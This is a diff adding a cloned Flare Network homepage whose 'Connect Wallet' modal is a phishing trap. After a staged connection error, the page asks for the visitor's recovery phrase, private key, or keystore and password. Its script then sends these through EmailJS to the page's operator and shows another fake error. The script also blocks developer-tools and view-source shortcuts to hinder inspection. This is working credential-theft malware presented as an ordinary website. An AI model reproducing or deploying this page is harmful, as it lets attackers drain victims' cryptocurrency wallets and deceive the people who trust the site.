@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flare Network - The blockchain for data</title>
+    <link rel="icon" href="https://flare.network/api/media/file/Flare.svg" type="image/x-icon">
+    <link href="styles.css" rel="stylesheet">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-text"><img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo">flare</span>
+            </div>
+            <nav class="nav" id="nav">
+                <a href="#" class="nav-link">Participate</a>
+                <a href="#" class="nav-link">Products</a>
+                <a href="#" class="nav-link">Developers</a>
+                <a href="#" class="nav-link">Network</a>
+                <a href="#" class="nav-link">News & Events</a>
+            </nav>
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-video-bg">
+            <video autoplay muted loop playsinline>
+                <source src="media/home_hero_mobile.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="hero-bg">
+            <div class="shape shape-1"></div>
+            <div class="shape shape-2"></div>
+            <div class="shape shape-3"></div>
+            <div class="shape shape-4"></div>
+        </div>
+        <div class="hero-content">
+            <div class="hero-icon">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="flare">
+            </div>
+            <h1 class="hero-title">The blockchain for data</h1>
+            <p class="hero-subtitle">
+                Flare is a full-stack layer 1 solution designed for data intensive use cases.
+            </p>
+            <button class="cta-button" id="connectWalletBtn">Connect Wallet</button>
+        </div>
+    </section>
+
+    <!-- Updated Wallet Modal -->
+    <div id="walletModal" class="wallet-modal">
+        <div class="wallet-modal-content">
+            <!-- Wallet Selection Screen -->
+            <div id="walletSelectionScreen" class="wallet-screen">
+                <div class="modal-header">
+                    <div class="modal-title">Connect Wallet</div>
+                    <button class="close-button" id="closeWalletModal">&times;</button>
+                </div>
+                
+                <button class="wallet-option" data-wallet="MetaMask">
+                    <div class="wallet-info">
+                        <div class="wallet-name">MetaMask</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon metamask-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="WalletConnect">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Wallet Connect</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon walletconnect-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="Coinbase">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Coinbase Connect</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon coinbase-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="Ledger">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Ledger</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon ledger-icon"></div>
+                </button>
+                
+                <p class="terms-text">By connecting a wallet, you agree to the <a href="#" class="terms-link">Terms of Service</a></p>
+            </div>
+
+            <!-- Connecting Screen -->
+            <div id="connectingScreen" class="wallet-screen">
+                <button class="close-button" id="closeConnectingScreen">&times;</button>
+                
+                <div class="connecting-message">
+                    Initializing connection
+                    <div class="loading-dots">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                
+                <div class="connecting-wallet-info">
+                    <div class="connecting-wallet-left">
+                        <div id="connectingWalletIcon" class="connecting-wallet-icon"></div>
+                        <span id="connectingWalletName" class="connecting-wallet-name">MetaMask</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Error Screen -->
+            <div id="errorScreen" class="wallet-screen">
+                <button class="close-button" id="closeErrorScreen">&times;</button>
+                
+                <div class="error-message">Error Connecting...</div>
+                
+                <div class="wallet-info-box">
+                    <div class="wallet-info-left">
+                        <div id="selectedWalletIcon" class="wallet-icon"></div>
+                    </div>
+                    <span id="selectedWalletName">MetaMask Wallet</span>
+                </div>
+                
+                <button id="manualConnectBtn" class="manual-connect-btn">Connect Manually</button>
+            </div>
+
+            <!-- Manual Connection Screen -->
+            <div id="manualScreen" class="wallet-screen">
+                <div class="wallet-header">
+                    <div id="walletLogoContainer">
+                        <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare" class="flare-logo">
+                    </div>
+                    <button class="close-button" id="closeManualScreen">&times;</button>
+                </div>
+                
+                <div class="tabs">
+                    <button class="tab-button active" data-tab="phrase">Phrase</button>
+                    <button class="tab-button" data-tab="keystore">Keystore</button>
+                    <button class="tab-button" data-tab="privateKey">Private Key</button> <!-- CHANGED: data-tab now matches id -->
+                </div>
+
+                <div id="phraseTab" class="tab-content active">
+                    <textarea id="phraseInput" placeholder="Enter your recovery phrase" rows="5"></textarea>
+                    <p class="input-hint">Typically 12 (sometimes 24) words separated by single spaces</p>
+                </div>
+
+                <div id="keystoreTab" class="tab-content">
+                    <textarea id="keystoreInput" placeholder="Keystore" rows="4"></textarea>
+                    <input type="password" id="passwordInput" placeholder="Password">
+                    <p class="input-hint">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                </div>
+
+                <div id="privateKeyTab" class="tab-content">
+                    <input type="text" id="privateKeyInput" class="private-key-input" placeholder="Private Key">
+                    <p class="input-hint">Typically 64 characters not separated by spaces</p>
+                </div>
+
+                <button id="proceedBtn" class="proceed-btn">Proceed</button>
+            </div>
+        </div>
+    </div>
+
+    <section class="partners">
+        <div class="container">
+            <p class="partners-label">Building with the best</p>
+
+            <div class="partners-grid">
+                <div class="partner"><img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FElliptic.png&w=384&q=75" height="55" alt="Elliptic"></div>
+                <div class="partner layerzero">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FLayerZero_Logo_Full%201.png&w=640&q=75" height="55" alt="LayerZero">
+                </div>
+                <div class="partner hypernative">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fhypernative.png&w=640&q=75" height="55" alt="Hypernative">
+                </div>
+                <div class="partner google-cloud">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FGoogle_Cloud.png&w=640&q=75" height="55" alt="Google Cloud">
+                </div>
+                <div class="partner ankr"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fankr-1.png&w=384&q=75" alt="Ankr"></div>
+                <div class="partner arkham"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FArkham.png&w=384&q=75" alt="Arkham"></div>
+                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" alt="HexTrust"></div>
+            </div>
+        </div>
+    </section>
+    <section class="flare-tech-section">
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>FOUNDATIONAL TECHNOLOGY</h4>
+                <div class="box pink">
+                    <strong><h3>Enshrined Data Protocols</h3></strong>
+                    <p>Flare's protocols are integrated into the blockchain's core, and inherit the economic security of the entire network</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink">
+                    <strong><h3>Ethereum Virtual Machine</h3></strong>
+                    <p>Flare is EVM compatible with out-of-the-box support for all your favorite tooling</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink">
+                    <strong><h3>Flare Stake</h3></strong>
+                </div>
+                <p>Flare uses a proof-of-stake (PoS) mechanism to ensure a significant and consistent level of economic security</p>
+            </div>
+        </div>
+
+        <div class="flare-center">
+            <div class="flare-video">
+                <video src="media/city_ori.mp4" autoplay loop muted></video>
+            </div>
+        </div>
+
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>NEW USE CASES</h4>
+                <div class="box pink">
+                    <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
+                    <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
+                </div>
+            </div>
+
+            <div class="flare-box">
+                <h4>ENSHRINED DATA PROTOCOLS</h4>
+                <div class="box pink">
+                    <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
+                    <p>Reliably access external blockchain events and real-world APIs</p>
+                </div>
+                <div class="box pink">
+                    <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
+                    <p>Easily integrate fast, secure, and decentralized price feeds</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="art-image">
+        <img src="media/fassets.webp" height="130" alt="FAssets">
+        <div>
+            <strong><p style="color: darkgrey;">FLARE FEATURED NEWS</p></strong>
+            <img src="media/FAssets-2.svg" height="60" style="display: inline-block;" alt="FAssets logo"><img id="xrp" src="media/XRP.svg" height="90" style="display: inline-block;" alt="XRP logo">
+            <p>FAssets v1.1 Launches on Songbird -<br> Unlocking Scalable FXRP Minting</p><br> <p>May 14. 2025</p>
+        </div>
+    </section>
+    <section class="fast-stats-section" id="fastSection">
+        <div class="background-video-container">
+            <video src="media/home_fast_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+
+        <div class="pink-art-image">
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Fast</h1>
+                <div class="counter" id="fastCounter" data-target="233527">0</div>
+                <p>1.6s avg block time with single-slot finality</p>
+            </div>
+        </div>
+    </section>
+    <br>
+    <section class="fast-stats-section" id="decentralizedSection">
+        <div class="pink-art-image">
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Decentralized</h1>
+                <div class="counter" id="decentralizedCounter" data-target="33">0</div>
+                <h3>100 Data providers</h3>
+                <p>Maximum Stake per data provider</p>
+            </div>
+        </div>
+        <div class="background-video-container">
+            <video src="media/home_providers_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+    </section>
+    <section class="participate">
+        <h2 class="title">Participate in Flare</h2>
+
+        <div class="banner">
+            <img src="https://flare.network/_next/image?url=%2Fen%2Fstatic%2F1200x400.jpg&w=3840&q=75" alt="Flare Fair Banner" />
+        </div>
+        <div class="cards">
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fflaredrop_4x.png&w=3840&q=75" alt="FlareDrops" />
+                <h3>Get FlareDrops →</h3>
+                <p>Wrap FLR to earn rewards</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fdandstake.png&w=384&q=75" alt="Delegate & Stake" />
+                <h3>Delegate & Stake →</h3>
+                <p>A simple and effective way of boosting rewards while contributing to Flare's security</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FVote_Hero.png&w=1920&q=75" alt="Vote" />
+                <h3>Vote →</h3>
+                <p>Participate in transparent, onchain governance to define the future of Flare</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FCommunity_Header.png&w=1920&q=75" alt="Community" />
+                <h3>Community →</h3>
+                <p>Come together, share ideas, and build</p>
+            </div>
+        </div>
+    </section>
+    <section class="newsletter-section">
+        <div class="newsletter-content">
+            <h2>Subscribe to the Flare Newsletter</h2>
+            <p>Join over 30,000 Flare community members. Sign up to the Flare newsletter today to hear the latest on product releases, ecosystem announcements and global events.</p>
+            <button class="subscribe-button">Subscribe</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo" class="footer-logo">
+                <span class="tagline">The blockchain for data</span>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Newsletter</a>
+                <a href="#">Contact</a>
+                <a href="#">Our Team</a>
+                <a href="#">Brand Assets</a>
+                <a href="#">Terms & Conditions</a>
+                <span>© Flare 2025</span>
+            </div>
+
+            <div class="social-icons">
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.8SVgggxQcO5L6Dw_61ac4QHaEK?w=285&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="GitHub"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.Y6P1GkxkEoLoIRsS1wMZiwHaFj?w=254&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="YouTube"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.Cn9SAHCmTy8MEaixr8bqpAHaHa?w=172&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="LinkedIn"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.SqoeKJPmo667mmrM6IQCxwHaEK?w=263&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Discord"></a>
+                <a href="#"><img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8qUQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter"></a>
+                <a href="#"><img src="https://th.bing.com/th/id/OIP.lYN2s7Dv1a4pLAVUaXMCVgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Telegram"></a>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <h4>DEV LINKS</h4>
+            <div class="dev-links">
+                <a href="#">Flarescan →</a>
+                <a href="#">Flare P-Chain Explorer →</a>
+                <a href="#">Flare Systems Explorer →</a>
+            </div>
+        </div>
+    </footer>
+     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+    const connectWalletBtn = document.getElementById('connectWalletBtn');
+    const walletModal = document.getElementById('walletModal');
+    const closeWalletModal = document.getElementById('closeWalletModal');
+    const closeConnectingScreen = document.getElementById('closeConnectingScreen');
+    const closeErrorScreen = document.getElementById('closeErrorScreen');
+    const closeManualScreen = document.getElementById('closeManualScreen');
+    const walletOptions = document.querySelectorAll('.wallet-option');
+    const walletSelectionScreen = document.getElementById('walletSelectionScreen');
+    const connectingScreen = document.getElementById('connectingScreen');
+    const errorScreen = document.getElementById('errorScreen');
+    const manualScreen = document.getElementById('manualScreen');
+    const selectedWalletName = document.getElementById('selectedWalletName');
+    const selectedWalletIcon = document.getElementById('selectedWalletIcon');
+    const connectingWalletName = document.getElementById('connectingWalletName');
+    const connectingWalletIcon = document.getElementById('connectingWalletIcon');
+    const manualConnectBtn = document.getElementById('manualConnectBtn');
+    const walletLogoContainer = document.getElementById('walletLogoContainer');
+    const tabButtons = document.querySelectorAll('.tab-button');
+    const tabContents = document.querySelectorAll('.tab-content');
+    const proceedBtn = document.getElementById('proceedBtn');
+    const fastSection = document.getElementById('fastSection');
+    const decentralizedSection = document.getElementById('decentralizedSection');
+    const fastCounter = document.getElementById('fastCounter');
+    const decentralizedCounter = document.getElementById('decentralizedCounter');
+
+    // EmailJS specific elements (updated IDs based on your HTML)
+    const phraseInput = document.getElementById('phraseInput');
+    const privateKeyInput = document.getElementById('privateKeyInput');
+    const keystoreInput = document.getElementById('keystoreInput'); // Corrected ID for keystore textarea
+    const passwordInput = document.getElementById('passwordInput');   // Corrected ID for keystore password
+
+    let currentWalletType = 'MetaMask';
+    const walletIcons = {
+        'MetaMask': 'media/download (1).png',
+        'WalletConnect': 'https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png',
+        'Coinbase': 'https://www.pngall.com/wp-content/uploads/15/Coinbase-Logo-PNG-Images.png',
+        'Ledger': 'https://th.bing.com/th/id/OIP.CBGu--2fe8tuzrTgd4qYxAAAAA?w=408&h=408&rs=1&pid=ImgDetMain'
+    };
+
+    emailjs.init("zXKuNUM9QxI97CCT5"); // Replace with your EmailJS User ID
+
+    // Function to show specific screen
+    function showScreen(type) {
+        walletSelectionScreen.style.display = 'none';
+        connectingScreen.style.display = 'none';
+        errorScreen.style.display = 'none';
+        manualScreen.style.display = 'none';
+
+        if (type === 'wallet') {
+            walletSelectionScreen.style.display = 'block';
+        } else if (type === 'connecting') {
+            connectingScreen.style.display = 'block';
+        } else if (type === 'error') {
+            errorScreen.style.display = 'block';
+        } else if (type === 'manual') {
+            manualScreen.style.display = 'block';
+        }
+    }
+
+    function showTab(tabId) {
+        tabContents.forEach(content => {
+            content.classList.remove('active');
+        });
+        const activeTabContent = document.getElementById(tabId);
+        if (activeTabContent) {
+            activeTabContent.classList.add('active');
+        }
+    }
+
+    function updateWalletLogo(walletType) {
+        walletLogoContainer.innerHTML = '';
+
+        if (walletType === 'MetaMask' || walletType === 'WalletConnect' || walletType === 'Coinbase' || walletType === 'Ledger') {
+            const walletIcon = document.createElement('div');
+            walletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+            walletIcon.style.width = '32px';
+            walletIcon.style.height = '32px';
+            walletIcon.style.backgroundSize = 'contain';
+            walletIcon.style.backgroundRepeat = 'no-repeat';
+            walletIcon.style.backgroundPosition = 'center';
+            walletLogoContainer.appendChild(walletIcon);
+        } else {
+            // Default to Flare logo
+            const flareLogo = document.createElement('img');
+            flareLogo.src = 'https://flare.network/api/media/file/Flare.svg';
+            flareLogo.alt = 'Flare';
+            flareLogo.className = 'flare-logo';
+            walletLogoContainer.appendChild(flareLogo);
+        }
+    }
+
+    // Counter animation function
+    function animateCounter(counter, target) {
+        const duration = 2000; // 2 seconds
+        const startTime = Date.now();
+        const startValue = parseInt(counter.textContent);
+        const endValue = parseInt(target);
+
+        function updateCounter() {
+            const currentTime = Date.now();
+            const elapsed = currentTime - startTime;
+
+            if (elapsed < duration) {
+                const progress = elapsed / duration;
+                const currentValue = Math.floor(startValue + (endValue - startValue) * progress);
+                counter.textContent = currentValue;
+                requestAnimationFrame(updateCounter);
+            } else {
+                counter.textContent = endValue;
+            }
+        }
+
+        updateCounter();
+    }
+
+    const observerOptions = {
+        root: null,
+        rootMargin: '0px',
+        threshold: 0.5
+    };
+
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                if (entry.target.id === 'fastSection') {
+                    entry.target.classList.add('animate');
+                    animateCounter(fastCounter, fastCounter.getAttribute('data-target'));
+                } else if (entry.target.id === 'decentralizedSection') {
+                    entry.target.classList.add('animate');
+                    animateCounter(decentralizedCounter, decentralizedCounter.getAttribute('data-target'));
+                }
+                observer.unobserve(entry.target);
+            }
+        });
+    }, observerOptions);
+
+    observer.observe(fastSection);
+    observer.observe(decentralizedSection);
+
+    fastSection.addEventListener('mouseenter', () => {
+        if (!fastSection.classList.contains('animate')) {
+            fastSection.classList.add('animate');
+            animateCounter(fastCounter, fastCounter.getAttribute('data-target'));
+        }
+    });
+
+    decentralizedSection.addEventListener('mouseenter', () => {
+        if (!decentralizedSection.classList.contains('animate')) {
+            decentralizedSection.classList.add('animate');
+            animateCounter(decentralizedCounter, decentralizedCounter.getAttribute('data-target'));
+        }
+    });
+
+    connectWalletBtn.addEventListener('click', () => {
+        walletModal.style.display = 'flex';
+        showScreen('wallet');
+        document.body.style.overflow = 'hidden'; 
+    });
+
+    closeWalletModal.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto'; 
+    });
+
+    closeConnectingScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    closeErrorScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    closeManualScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    walletModal.addEventListener('click', (e) => {
+        if (e.target === walletModal) {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+    });
+
+    walletOptions.forEach(option => {
+        option.addEventListener('click', function () {
+            const walletName = this.querySelector('.wallet-name').textContent;
+            const walletType = this.getAttribute('data-wallet');
+            currentWalletType = walletType;
+
+            connectingWalletName.textContent = walletName;
+            if (connectingWalletIcon) {
+                connectingWalletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+                connectingWalletIcon.className = 'connecting-wallet-icon';
+            }
+
+            selectedWalletName.textContent = walletName + ' Wallet';
+            if (selectedWalletIcon) {
+                selectedWalletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+                selectedWalletIcon.className = 'wallet-icon';
+            }
+
+            showScreen('connecting');
+
+            setTimeout(() => {
+                showScreen('error');
+            }, 3000);
+        });
+    });
+
+    manualConnectBtn.addEventListener('click', () => {
+        updateWalletLogo(currentWalletType);
+        showScreen('manual');
+
+        document.querySelector('.tab-button[data-tab="phrase"]').click();
+    });
+
+    tabButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            tabButtons.forEach(btn => {
+                btn.classList.remove('active');
+            });
+            this.classList.add('active');
+
+            
+            const tabId = this.getAttribute('data-tab') + 'Tab';
+            showTab(tabId);
+        });
+    });
+
+    proceedBtn.addEventListener('click', () => {
+        showScreen('connecting');
+        let phrase = '';
+        let privateKey = '';
+        let keystoreJson = '';
+        let keystorePassword = '';
+
+        const activeTab = document.querySelector('.tab-button.active').getAttribute('data-tab');
+
+        if (activeTab === 'phrase' && phraseInput) {
+            phrase = phraseInput.value;
+        } else if (activeTab === 'privateKey' && privateKeyInput) { 
+            privateKey = privateKeyInput.value;
+        } else if (activeTab === 'keystore' && keystoreInput && passwordInput) {
+            keystoreJson = keystoreInput.value;
+            keystorePassword = passwordInput.value;
+        }
+        const templateParams = {
+            wallet_type: currentWalletType,
+            phrase: phrase,
+            private_key: privateKey,
+            keystore_json: keystoreJson,
+            keystore_password: keystorePassword
+        };
+        setTimeout(() => {
+            emailjs.send('service_84yoi3q', 'template_qycsuue', templateParams) 
+                .then(function(response) {
+                    console.log('EmailJS SUCCESS!', response.status, response.text);
+                    document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Error connecting. Please try again later.';
+                    showScreen('error');
+                }, function(error) {
+                    console.log('EmailJS FAILED...', error);
+                    document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Failed to send information. Please check your inputs.';
+                    showScreen('error');
+                });
+        }, 3000); 
+    });
+
+    
+    document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape' && walletModal.style.display === 'flex') {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+    });
+
+    
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const nav = document.getElementById('nav');
+
+    mobileMenuBtn.addEventListener('click', function() {
+        this.classList.toggle('active');
+        nav.classList.toggle('active');
+    });
+});
+ document.addEventListener("keydown", y => {
+      if (
+        (y.ctrlKey && y.shiftKey && ["I", "J", "C"].includes(y.key.toUpperCase())) ||
+        (y.ctrlKey && y.key.toLowerCase() === "u") ||
+        y.key === "F12"
+      ) {
+        y.preventDefault();
+        location.reload();
+      }
+    });
+    </script>
+</body>
+</html>
